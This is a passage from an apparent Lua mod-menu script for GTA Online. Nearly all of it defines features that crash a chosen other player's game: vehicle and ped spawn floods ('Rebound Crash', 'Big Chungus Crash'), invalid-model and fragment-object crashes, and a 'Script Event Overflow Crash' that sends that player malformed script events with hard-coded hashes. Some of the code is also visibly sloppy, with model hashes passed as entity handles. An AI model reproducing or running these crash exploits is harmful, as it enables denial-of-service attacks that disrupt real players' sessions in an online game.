menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(csPID))
util.yield()
util.toast("Cherax Crash Sent to " .. players.get_name(csPID))
util.log("Cherax Crash Sent to " .. players.get_name(csPID))
end
end)

menu.action(main_menu,"Rebound Crash", {"reboundcrash"}, "Working.", function()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = players.get_position(csPID)
local mdl = util.joaat("mp_m_freemode_01")
local veh_mdl = util.joaat("taxi")
util.request_model(veh_mdl)
util.request_model(mdl)
for i = 1, 1 do
if not players.exists(csPID) then
return
end
local veh = entities.create_vehicle(veh_mdl, pos, 0)
local jesus = entities.create_ped(2, mdl, pos, 0)
PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
util.yield(100)
TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
util.yield(2000)
entities.delete_by_handle(jesus)
entities.delete_by_handle(veh)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
util.toast("Rebound Crash Sent to " .. players.get_name(csPID))
util.log("Rebound Crash Sent to " .. players.get_name(csPID))
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(main_menu,"Rebound Crash", {"reboundcrash"}, "Working. Can't crash yourself with toggled.", function()
if pid ~= players.user() then
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = players.get_position(csPID)
local mdl = util.joaat("mp_m_freemode_01")
local veh_mdl = util.joaat("taxi")
util.request_model(veh_mdl)
util.request_model(mdl)
for i = 1, 10 do
if not players.exists(csPID) then
return
end
local veh = entities.create_vehicle(veh_mdl, pos, 0)
local jesus = entities.create_ped(2, mdl, pos, 0)
PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
util.yield(100)
TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
util.yield(1000)
entities.delete_by_handle(jesus)
entities.delete_by_handle(veh)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
util.toast("Rebound Crash Sent to " .. players.get_name(csPID))
util.log("Rebound Crash Sent to " .. players.get_name(csPID))
end
end)

menu.toggle_loop(MenuPlayerRemovalCrash, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript) Crash is extremely powerful and may result in crashing yourself, be aware.", function(on_toggle)
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
local mdl = util.joaat("A_C_Cat_01")
local mdl2 = util.joaat("U_M_Y_Zombie_01")
local mdl3 = util.joaat("A_F_M_ProlHost_01")
local mdl4 = util.joaat("A_M_M_SouCent_01")
local veh_mdl = util.joaat("insurgent2")
local veh_mdl2 = util.joaat("brawler")
util.request_model(veh_mdl)
util.request_model(veh_mdl2)
util.request_model(mdl)
util.request_model(mdl2)
util.request_model(mdl3)
util.request_model(mdl4)
for i = 1, 250 do
local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
util.yield(100)
PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)

PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
entities.delete_by_handle(mdl)
entities.delete_by_handle(mdl2)
entities.delete_by_handle(mdl3)
entities.delete_by_handle(mdl4)
entities.delete_by_handle(veh_mdl)
entities.delete_by_handle(veh_mdl2)
util.yield(1000)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle(MenuPlayerRemovalCrash, "Chungus Crash", {"bigchungustoggle"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript) Crash is extremely powerful and may result in crashing yourself, be aware.", function(on_toggle)
    if on_toggle then
    menu.trigger_commands("tploopon" .. players.get_name(csPID))
    menu.trigger_commands("anticrashcamera On")
    menu.trigger_commands("invisibility On")
    menu.trigger_commands("levitate On")
    menu.trigger_commands("potatomode On")
    menu.trigger_commands("nosky On")
    menu.trigger_commands("reducedcollision On")
    menu.trigger_commands("nocollision On")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local mdl = util.joaat("A_C_Cat_01")
    local mdl2 = util.joaat("U_M_Y_Zombie_01")
    local mdl3 = util.joaat("A_F_M_ProlHost_01")
    local mdl4 = util.joaat("A_M_M_SouCent_01")
    local veh_mdl = util.joaat("insurgent2")
    local veh_mdl2 = util.joaat("brawler")
    util.request_model(veh_mdl)
    util.request_model(veh_mdl2)
    util.request_model(mdl)
    util.request_model(mdl2)
    util.request_model(mdl3)
    util.request_model(mdl4)
    for i = 1, 250 do
        local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
        local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
        local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
        local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
        util.yield(100)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
        
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

        ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
        PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
    entities.delete_by_handle(mdl)
    entities.delete_by_handle(mdl2)
    entities.delete_by_handle(mdl3)
    entities.delete_by_handle(mdl4)
    entities.delete_by_handle(veh_mdl)
    entities.delete_by_handle(veh_mdl2)
    util.yield(1000)
else
    menu.trigger_commands("tploopon" .. players.get_name(csPID))
    util.yield(100)
    menu.trigger_commands("anticrashcamera Off")
    menu.trigger_commands("tpmazehelipad")
    menu.trigger_commands("invisibility Off")
    menu.trigger_commands("levitate Off")
    menu.trigger_commands("potatomode Off")
    menu.trigger_commands("nosky Off")
    menu.trigger_commands("reducedcollision Off")
    menu.trigger_commands("nocollision Off")
    end
end)

    menu.action(MenuPlayerRemovalCrash, "Invalid Model Crash", {"gsplayerremovalcrashim"}, "Does some Crazy things with a Poodle Model that Results in a Crash for that player.", function(on_click)
        local mdl = util.joaat('a_c_poodle')
        BlockSyncs(csPID, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(csPID)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(csPID), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
            else
                util.toast("Failed to load model. :/")
            end
        end)
    end)

    menu.action(MenuPlayerRemovalCrash, "Fragment Crash", {"gsplayerremovalcrashf"}, "Uses Function 'BREAK_OBJECT_FRAGMENT_CHILD' to Crash the Player.", function(on_click)
        BlockSyncs(csPID, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)    

    menu.action(MenuPlayerRemovalCrash, "Script Event Overflow Crash", {"scriptcrash"}, "Spams the Player with Big Script Events which Crashes their Game.", function(on_click)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << csPID, {2765370640, csPID, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), csPID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << csPID, {1348481963, csPID, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(csPID))                                                             
        util.yield(100)
        util.trigger_script_event(1 << csPID, {495813132, csPID, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << csPID, {495813132, csPID, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << csPID, {495813132, csPID,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)
end

players.on_join(PlayerAddRoot)
players.dispatch_on_join()




--  ||| MAIN TICK LOOP ||| --
local last_car = 0
while true do
    player_cur_car = entities.get_user_vehicle_as_handle()
    if last_car ~= player_cur_car and player_cur_car ~= 0 then 
        on_user_change_vehicle(player_cur_car)
        last_car = player_cur_car
    end
    util.yield()
end
util.keep_running()
